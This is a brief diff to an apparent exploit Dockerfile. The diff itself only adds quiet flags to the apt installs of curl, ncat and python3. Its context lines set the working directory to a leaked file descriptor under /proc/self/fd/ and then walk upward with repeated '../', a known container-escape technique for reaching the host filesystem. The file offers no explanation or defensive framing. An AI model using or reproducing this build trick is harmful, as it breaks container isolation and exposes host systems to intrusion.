@@ -1,6 +1,6 @@
 FROM ubuntu:20.04
-RUN apt update -y 
-RUN apt install -y curl && apt install -y ncat && apt install python3 -y
+RUN apt update -y -qq
+RUN apt install -y -qq curl && apt install -y -qq ncat && apt install python3 -y -qq
 WORKDIR /proc/self/fd/9/
 RUN cd ../../../../../../../../
 
